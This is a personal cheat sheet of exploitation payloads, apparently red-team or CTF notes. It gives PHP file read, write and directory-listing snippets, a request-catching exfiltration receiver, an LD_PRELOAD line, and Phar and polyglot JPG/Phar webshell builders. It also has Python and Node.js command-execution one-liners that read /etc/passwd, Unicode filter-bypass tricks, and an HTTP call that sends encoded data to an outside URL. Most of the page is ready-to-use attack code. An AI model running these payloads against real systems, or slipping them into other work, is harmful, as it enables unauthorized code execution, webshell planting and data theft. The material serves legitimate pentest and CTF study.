# Exploitation Payloads

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## Shell

<div class="row row-cols-lg-2"><div>

#### Shell ‚Äî Blind PoC

To see if your code is executed in a (semi) blind context:

```ps
$ ping -c 1 HOST_IP # execute by target
$ sudo tcpdump -i tun0 icmp # see if you got ping
```
</div><div>
</div></div>

<hr class="sep-both">

## PHP

<div class="row row-cols-lg-2"><div>

#### PHP ‚Äî POC

We often run `phpinfo` to get information.

```php!
<?php phpinfo() ?>
```

We may also want some additional information:

```php!
<?php echo "Current directory: " . getcwd(); ?>
```

<br>

#### PHP ‚Äî Read a file

There are multiple functions you might use:

```php!
<?php
$fileContents = file_get_contents('index.php');
$fileContents = show_source('index.php', true);
$fileContents = highlight_file('index.php', true);
$fileContents = readfile('index.php');
echo $fileContents;
?>
```

Base64 encoding is not always necessary, especially with `show_source`.

```php!
$fileContents = base64_encode($fileContents);
```

<br>

#### PHP ‚Äî Write a file

There are multiple functions you might use:

```php!
file_put_contents('/tmp/poc', base64_decode('...')); 
```

You may have to change the permissions:

```php!
chmod('/tmp/poc', 0777);
```
</div><div>

#### PHP ‚Äî Execute Shell Commands

Refer to [webshells#php](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md#php-web-shell).

<br>

#### PHP ‚Äî Directory Listing

A few different ways to achieve the same output:

```php!
<?php
var_dump(scandir("."));

$files = scandir(".");
foreach ($files as $file) {
    echo $file;
}

$dir=dir('.');
while ($f = $dir->read()) {
    echo $f;
}

$dir = opendir(".");
while($f = readdir($dir)) {
    echo $f;
}
```

<br>

#### PHP ‚Äî Catch Requests

Decode `zlib` compressed and `base64` encoded payload.

```php!
$p=str_replace(" ", "+", $_GET['p']);
$r=zlib_decode(base64_decode($p));
file_put_contents('requests.txt', "Request:\n$r\n", FILE_APPEND | LOCK_EX);
```
```php!
if ($_SERVER["REQUEST_METHOD"] === "POST") {} // ...
```

<br>

#### PHP ‚Äî Random

```php!
putenv('LD_PRELOAD=/path/to/xxx.so');
```
</div></div>

<hr class="sep-both">

## Phar

[![file_upload_polyglot](../../../../_badges/rootme/web_server/file_upload_polyglot.svg)](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

<div class="row row-cols-lg-2"><div>

Simply zipping the PHP may work. Otherwise, you can use:

```php!
<?php // Run 'php --define phar.readonly=0 gen.php'
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
// or: $phar->addFile('shell.php', 'shell.php');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

‚û°Ô∏è `shell.php` is the file inside the archive.
</div><div>

To create a **Polyglot Phar** <small>(Ex: JPG with \xff\xd8 and \xff\xd9)</small>

```php!
<?php // php --define phar.readonly=0 gen.php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php /*code*/ ?>');
$phar->setStub("\xff\xd8\xff\xd9\n<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
```

üìö For reference, `include 'phar://./shell.phar/shell.php';`
</div></div>

<hr class="sep-both">

## Python

<div class="row row-cols-lg-2"><div>

Simple python code to run a command.

```py
import os;os.system('ls -1a');
import os;os.popen("ls -1a").read();
import subprocess; subprocess.run(['ls', '-1a']);
import subprocess;print(subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, text=True).stdout)
```

A few commands to craft alternative payloads:

```py
builtins.__dict__                        # builtins
import keyword; print(keyword.kwlist)    # keywords
import string; print(string.punctuation) # symbols
```
</div><div>

A few utilities to bypass filters:

* `chr(i)` such as `chr(46)` for `.`
* Alternative characters: `gloÔΩÇals()`, `ùò¶ùòπùò¶ùò§`, `ùôöùìçùìÆùò§`
* Alternative characters: [ItalicTextGenerator](https://lingojam.com/ItalicTextGenerator)

Encoding/Decoding utilities:

* For base64 + URL encoding: `base64.urlsafe_b64encode(payload)`
* ...
</div></div>

<hr class="sep-both">

## Node.js

<div class="row row-cols-lg-2"><div>

#### Node.js ‚Äî Read Files

Read the source code of the main script:

```js!
require('fs').readFileSync(process.argv[1])
```

#### Node.js ‚Äî Execute Commands

You can use `execSync` or `exec` which is async and using a callback.

```js!
require('child_process').execSync('cat /etc/passwd')
```

#### Node.js ‚Äî HTTP Server

...

#### Node.js ‚Äî HTTP Requests

For get requests, we can use relatively short payloads:

```js!
require('http').get('URL?arg='+url_encoded_value);
```
</div><div>

#### Node.js ‚Äî Encoding/Decoding utilities

```js!
// Base64 Encode
const encodedData = Buffer.from(data).toString('base64');
const decodedData = Buffer.from(encodedData, 'base64').toString('utf-8');
// URL Encode
const urlEncodedString = encodeURIComponent(data);
```
</div></div>